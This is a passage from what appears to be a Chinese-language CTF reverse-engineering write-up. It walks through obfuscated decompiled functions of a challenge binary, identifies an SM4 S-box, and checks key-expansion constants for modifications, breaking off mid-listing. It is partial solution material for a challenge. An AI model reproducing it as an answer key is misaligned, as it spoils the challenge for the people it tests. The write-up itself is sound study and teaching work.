[rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v26 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v21 = ((((_BYTE)dword_8100 - <span class="number">1</span>) * (_BYTE)dword_8100) &amp; <span class="number">1</span>) == <span class="number">0</span>;</span><br><span class="line">  v22 = dword_80D0 &lt; <span class="number">10</span>;</span><br><span class="line">  v20 = <span class="number">-1362590688</span>;</span><br><span class="line">  v19 = a1;</span><br><span class="line">  v18 = a2;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v17 = v20;</span><br><span class="line">          v16 = v20 + <span class="number">1362590688</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v20 != <span class="number">-1362590688</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v2 = <span class="number">68268958</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v22 || v21 )</span><br><span class="line">            v2 = <span class="number">-1082117606</span>;</span><br><span class="line">          v20 = v2;</span><br><span class="line">        &#125;</span><br><span class="line">        v15 = v17 + <span class="number">1082117606</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v17 != <span class="number">-1082117606</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v3 = <span class="number">68268958</span>;</span><br><span class="line">        v23 = &amp;v8;</span><br><span class="line">        v24 = &amp;v8;</span><br><span class="line">        v25 = (__int64 *)(&amp;v8 - <span class="number">2</span>);</span><br><span class="line">        v8 = v18;</span><br><span class="line">        *(_DWORD *)v25 = <span class="number">0</span>;</span><br><span class="line">        *(_DWORD *)v25 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( dword_80D0 &lt; <span class="number">10</span> || ((((_BYTE)dword_8100 - <span class="number">1</span>) * (_BYTE)dword_8100) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          v3 = <span class="number">753533903</span>;</span><br><span class="line">        v20 = v3;</span><br><span class="line">      &#125;</span><br><span class="line">      v14 = v17 - <span class="number">68268958</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v17 != <span class="number">68268958</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v7 = (__int64 *)(&amp;v8 - <span class="number">2</span>);</span><br><span class="line">      v8 = v18;</span><br><span class="line">      *(_DWORD *)v7 = <span class="number">0</span>;</span><br><span class="line">      *(_DWORD *)v7 = <span class="number">0</span>;</span><br><span class="line">      v20 = <span class="number">-1082117606</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = v17 - <span class="number">462079399</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v17 == <span class="number">462079399</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v12 = v17 - <span class="number">753533903</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v17 == <span class="number">753533903</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = <span class="number">949053677</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v11 = v17 - <span class="number">949053677</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v17 == <span class="number">949053677</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="number">462079399</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)v25 &lt; <span class="number">4</span> )</span><br><span class="line">          v4 = <span class="number">1315991260</span>;</span><br><span class="line">        v20 = v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v10 = v17 - <span class="number">1315991260</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v17 == <span class="number">1315991260</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = <span class="number">8</span> * *(_DWORD *)v25;</span><br><span class="line">          v8 = *v23;</span><br><span class="line">          *(_BYTE *)(*v24 + *(<span class="type">int</span> *)v25) = v8 &gt;&gt; (<span class="number">24</span> - (<span class="type">unsigned</span> __int8)v5);</span><br><span class="line">          v20 = <span class="number">1547077251</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9 = v17 - <span class="number">1547077251</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v17 == <span class="number">1547077251</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ++*(_DWORD *)v25;</span><br><span class="line">            v20 = <span class="number">949053677</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似 一大堆while混淆 实则就是 int-&gt;char之类的功能</p><p>sub_1670:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_1670</span><span class="params">(<span class="type">unsigned</span> __int64 a1, <span class="type">char</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (a1 &gt;&gt; (<span class="number">32</span> - a2)) ^ (a1 &lt;&lt; a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>移位xor操作 多半是跟加密有关</p><p>sub_16F0:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_16F0</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+10h] [rbp-B0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+88h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+8Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">bool</span> v15; <span class="comment">// [rsp+9Fh] [rbp-21h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+A0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v17; <span class="comment">// [rsp+A8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">4</span>]; <span class="comment">// [rsp+B0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">4</span>]; <span class="comment">// [rsp+B4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v20; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v20 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v17 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="keyword">sizeof</span>(v18));</span><br><span class="line">  sub_13A0(a1, (<span class="type">unsigned</span> __int64)s);</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">1269377601</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">while</span> ( v13 == <span class="number">-1404100861</span> )</span><br><span class="line">                    v13 = <span class="number">1269377601</span>;</span><br><span class="line">                  <span class="keyword">if</span> ( v13 != <span class="number">-1075359453</span> )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  ++v14;</span><br><span class="line">                  v13 = <span class="number">1980171296</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( v13 != <span class="number">-979710400</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                v2 = <span class="number">-80865339</span>;</span><br><span class="line">                v15 = v14 &lt; <span class="number">4</span>;</span><br><span class="line">                <span class="keyword">if</span> ( dword_811C &lt; <span class="number">10</span> || ((((_BYTE)dword_80EC - <span class="number">1</span>) * (_BYTE)dword_80EC) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">                  v2 = <span class="number">-741238317</span>;</span><br><span class="line">                v13 = v2;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( v13 != <span class="number">-741238317</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              v3 = <span class="number">-424386296</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v15 )</span><br><span class="line">                v3 = <span class="number">1085063542</span>;</span><br><span class="line">              v13 = v3;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v13 != <span class="number">-424386296</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v6 = <span class="number">957279085</span>;</span><br><span class="line">            <span class="keyword">if</span> ( dword_811C &lt; <span class="number">10</span> || ((((_BYTE)dword_80EC - <span class="number">1</span>) * (_BYTE)dword_80EC) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">              v6 = <span class="number">-243308292</span>;</span><br><span class="line">            v13 = v6;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v13 != <span class="number">-418270464</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v4 = <span class="number">-1075359453</span>;</span><br><span class="line">          <span class="keyword">if</span> ( dword_811C &lt; <span class="number">10</span> || ((((_BYTE)dword_80EC - <span class="number">1</span>) * (_BYTE)dword_80EC) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">            v4 = <span class="number">1980171296</span>;</span><br><span class="line">          v13 = v4;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v13 != <span class="number">-243308292</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        sub_1260((__int64)v18, &amp;v17);</span><br><span class="line">        v12 = v17;</span><br><span class="line">        v11 = sub_1670(v17, <span class="number">13</span>) ^ v12;</span><br><span class="line">        v7 = <span class="number">957279085</span>;</span><br><span class="line">        v17 = sub_1670(v17, <span class="number">23</span>) ^ v11;</span><br><span class="line">        v16 = v17;</span><br><span class="line">        <span class="keyword">if</span> ( dword_811C &lt; <span class="number">10</span> || ((((_BYTE)dword_80EC - <span class="number">1</span>) * (_BYTE)dword_80EC) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          v7 = <span class="number">218969482</span>;</span><br><span class="line">        v13 = v7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v13 != <span class="number">-80865339</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v13 = <span class="number">-979710400</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v13 == <span class="number">218969482</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">957279085</span>:</span><br><span class="line">        sub_1260((__int64)v18, &amp;v17);</span><br><span class="line">        v10 = v17;</span><br><span class="line">        v9 = sub_1670(v17, <span class="number">13</span>) ^ v10;</span><br><span class="line">        v17 = sub_1670(v17, <span class="number">23</span>) ^ v9;</span><br><span class="line">        v13 = <span class="number">-243308292</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1085063542</span>:</span><br><span class="line">        v18[v14] = byte_6130[(<span class="type">unsigned</span> __int8)s[v14]];</span><br><span class="line">        v13 = <span class="number">-418270464</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1269377601</span>:</span><br><span class="line">        v1 = <span class="number">-80865339</span>;</span><br><span class="line">        <span class="keyword">if</span> ( dword_811C &lt; <span class="number">10</span> || ((((_BYTE)dword_80EC - <span class="number">1</span>) * (_BYTE)dword_80EC) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          v1 = <span class="number">-979710400</span>;</span><br><span class="line">        v13 = v1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        v5 = <span class="number">-1075359453</span>;</span><br><span class="line">        ++v14;</span><br><span class="line">        <span class="keyword">if</span> ( dword_811C &lt; <span class="number">10</span> || ((((_BYTE)dword_80EC - <span class="number">1</span>) * (_BYTE)dword_80EC) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          v5 = <span class="number">-1404100861</span>;</span><br><span class="line">        v13 = v5;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v16;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里出现了 byte_6130<br>点击查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000006130 byte_6130       db 0D6h, 90h, 0E9h, 0FEh, 0CCh, 0E1h, 3Dh, 0B7h, 16h, 0B6h</span><br><span class="line">.rodata:0000000000006130                                         ; DATA XREF: sub_16F0:loc_1954↑o</span><br><span class="line">.rodata:0000000000006130                                         ; sub_1BC0+339↑o ...</span><br><span class="line">.rodata:000000000000613A                 db 14h, 0C2h, 28h, 0FBh, 2Ch, 5, 2Bh, 67h, 9Ah, 76h, 2Ah</span><br><span class="line">.rodata:0000000000006145                 db 0BEh, 4, 0C3h, 0AAh, 44h, 13h, 26h, 49h, 86h, 6, 99h</span><br><span class="line">.rodata:0000000000006150                 db 9Ch, 42h, 50h, 0F4h, 91h, 0EFh, 98h, 7Ah, 33h, 54h</span><br><span class="line">.rodata:000000000000615A                 db 0Bh, 43h, 0EDh, 0CFh, 0ACh, 62h, 0E4h, 0B3h, 1Ch, 0A9h</span><br><span class="line">.rodata:0000000000006164                 db 0C9h, 8, 0E8h, 95h, 80h, 0DFh, 94h, 0FAh, 75h, 8Fh</span><br><span class="line">.rodata:000000000000616E                 db 3Fh, 0A6h, 47h, 7, 0A7h, 0FCh, 0F3h, 73h, 17h, 0BAh</span><br><span class="line">.rodata:0000000000006178                 db 83h, 59h, 3Ch, 19h, 0E6h, 85h, 4Fh, 0A8h, 68h, 6Bh</span><br><span class="line">.rodata:0000000000006182                 db 81h, 0B2h, 71h, 64h, 0DAh, 8Bh, 0F8h, 0EBh, 0Fh, 4Bh</span><br><span class="line">.rodata:000000000000618C                 db 70h, 56h, 9Dh, 35h, 1Eh, 24h, 0Eh, 5Eh, 63h, 58h, 0D1h</span><br><span class="line">.rodata:0000000000006197                 db 0A2h, 25h, 22h, 7Ch, 3Bh, 1, 21h, 78h, 87h, 0D4h, 0</span><br><span class="line">.rodata:00000000000061A2                 db 46h, 57h, 9Fh, 0D3h, 27h, 52h, 4Ch, 36h, 2, 0E7h, 0A0h</span><br><span class="line">.rodata:00000000000061AD                 db 0C4h, 0C8h, 9Eh, 0EAh, 0BFh, 8Ah, 0D2h, 40h, 0C7h, 38h</span><br><span class="line">.rodata:00000000000061B7                 db 0B5h, 0A3h, 0F7h, 0F2h, 0CEh, 0F9h, 61h, 15h, 0A1h</span><br><span class="line">.rodata:00000000000061C0                 db 0E0h, 0AEh, 5Dh, 0A4h, 9Bh, 34h, 1Ah, 55h, 0ADh, 93h</span><br><span class="line">.rodata:00000000000061CA                 db 32h, 30h, 0F5h, 8Ch, 0B1h, 0E3h, 1Dh, 0F6h, 0E2h, 2Eh</span><br><span class="line">.rodata:00000000000061D4                 db 82h, 66h, 0CAh, 60h, 0C0h, 29h, 23h, 0ABh, 0Dh, 53h</span><br><span class="line">.rodata:00000000000061DE                 db 4Eh, 6Fh, 0D5h, 0DBh, 37h, 45h, 0DEh, 0FDh, 8Eh, 2Fh</span><br><span class="line">.rodata:00000000000061E8                 db 3, 0FFh, 6Ah, 72h, 6Dh, 6Ch, 5Bh, 51h, 8Dh, 1Bh, 0AFh</span><br><span class="line">.rodata:00000000000061F3                 db 92h, 0BBh, 0DDh, 0BCh, 7Fh, 11h, 0D9h, 5Ch, 41h, 1Fh</span><br><span class="line">.rodata:00000000000061FD                 db 10h, 5Ah, 0D8h, 0Ah, 0C1h, 31h, 88h, 0A5h, 0CDh, 7Bh</span><br><span class="line">.rodata:0000000000006207                 db 0BDh, 2Dh, 74h, 0D0h, 12h, 0B8h, 0E5h, 0B4h, 0B0h, 89h</span><br><span class="line">.rodata:0000000000006211                 db 69h, 97h, 4Ah, 0Ch, 96h, 77h, 7Eh, 65h, 0B9h, 0F1h</span><br><span class="line">.rodata:000000000000621B                 db 9, 0C5h, 6Eh, 0C6h, 84h, 18h, 0F0h, 7Dh, 0ECh, 3Ah</span><br><span class="line">.rodata:0000000000006225                 db 0DCh, 4Dh, 20h, 79h, 0EEh, 5Fh, 3Eh, 0D7h, 0CBh, 39h</span><br><span class="line">.rodata:000000000000622F                 db 48h</span><br></pre></td></tr></table></figure><p>这一看就是某种算法的SBOX啊… 把前几个值google一下 就能得到是SM4算法…</p><p>sub_1BC0 跟上一个差不多</p><p>sub_2220 这里调用了诸如char_2_int SM4等函数<br>猜测这就是主加密部分<br>那么交叉引用查看哪个地方调用了sub_2220<br>找到这里:<br>sub_3580</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_3580</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BOOL4 v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v9; <span class="comment">// [rsp+38h] [rbp-C8h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+5Ch] [rbp-A4h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+60h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+68h] [rbp-98h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// [rsp+7Ch] [rbp-84h]</span></span><br><span class="line">  __int64 v14[<span class="number">4</span>]; <span class="comment">// [rsp+80h] [rbp-80h]</span></span><br><span class="line">  __int64 v15[<span class="number">2</span>]; <span class="comment">// [rsp+A0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+B0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v17; <span class="comment">// [rsp+F0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v17 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x32</span>uLL);</span><br><span class="line">  v15[<span class="number">0</span>] = <span class="number">0xEFCDAB8967452301</span>LL;</span><br><span class="line">  v15[<span class="number">1</span>] = <span class="number">0xEFCDAB8967452301</span>LL;</span><br><span class="line">  v14[<span class="number">0</span>] = <span class="number">0x7C88631647197506</span>LL;</span><br><span class="line">  v14[<span class="number">1</span>] = <span class="number">0x4A0D7D3FFF55668B</span>LL;</span><br><span class="line">  v14[<span class="number">2</span>] = <span class="number">0xDEC2E93F384ED2F5</span>LL;</span><br><span class="line">  v14[<span class="number">3</span>] = <span class="number">0x3C1FB1746F7F7CDB</span>LL;</span><br><span class="line">  v12 = <span class="number">1</span>;</span><br><span class="line">  v9 = <span class="number">16</span> * (<span class="built_in">strlen</span>(a1) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">  v1 = (<span class="built_in">strlen</span>(a1) &amp; <span class="number">0xF</span>) != <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  sub_2220(v2, (__int64)v15, (__int64)a1, (__int64)s);</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以得到6个常量值<br>大致搜索一下<a href="https://zhuanlan.zhihu.com/p/363900323" target="_blank">SM4算法</a> 看看每个模块有没有魔改</p><p>这里跟着流程走一遍</p><h3 id="SM4的密钥扩展算法"><a href="#SM4的密钥扩展算法" class="headerlink" title="SM4的密钥扩展算法"></a>SM4的密钥扩展算法</h3><h4 id="1-与系统参数异或——初始化密钥"><a href="#1-与系统参数异或——初始化密钥" class="headerlink" title="1.与系统参数异或——初始化密钥"></a>1.与系统参数异或——初始化密钥</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sub_1260(a2, &amp;s);</span><br><span class="line">sub_1260(a2 + <span class="number">4</span>, &amp;v38);</span><br><span class="line">sub_1260(a2 + <span class="number">8</span>, &amp;v39);</span><br><span class="line">sub_1260(a2 + <span class="number">12</span>, &amp;v40);</span><br><span class="line">v36[<span class="number">0</span>] = s ^ <span class="number">0xA3B1BAC6</span>LL;</span><br><span class="line">v36[<span class="number">1</span>] = v38 ^ <span class="number">0x56AA3350</span>;</span><br><span class="line">v36[<span class="number">2</span>] = v39 ^ <span class="number">0x677D9197</span>;</span><br><span class="line">v36[<span class="number">3</span>] = v40 ^ <span class="number">0xB27022DC</span>LL;</span><br></pre></td></tr></table></figure><p>与正常参数对比发现没有改</p><h4 id="2-轮迭代生成轮密钥"><a href="#2-轮迭代生成轮密钥" class="headerlink" title="2.轮迭代生成轮密钥"></a>2.轮迭代生成轮密钥</h4><p>这里流程比较多<br>逐个检查<br>先看固定参数CKi的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.rodata:<span class="number">0000000000006030</span> ; _QWORD qword_6030[<span class="number">32</span>]</span><br><span class="line">.rodata:<span class="number">0000000000006030</span> qword_6030      dq <span class="number">70E15</span>h, <span class="number">1</span>C232A31h, <span class="number">383F</span>464Dh, <span class="number">545B</span>6269h, <span class="number">70777E85</span>h</span><br><span class="line">.rodata:<span class="number">0000000000006030</span>                                         ; DATA XREF: sub_2220:loc_282C↑o</span><br><span class="line">.rodata:<span class="number">0000000000006058</span>                 dq <span class="number">8</span>C939AA1h, <span class="number">0</span>A8AFB6BDh, <span class="number">0</span>C4CBD2D9h, <span class="number">0E0</span>E7EEF5h, <span class="number">0F</span>C030A11h</span><br><span class="line">.rodata:<span class="number">0000000000006080</span>                 dq <span class="number">181F</span>262Dh, <span class="number">343B</span>4249h, <span class="number">50575E65</span>h, <span class="number">6</span>C737A81h, <span class="number">888F</span>969Dh</span><br><span class="line">.rodata:<span class="number">00000000000060</span>A8                 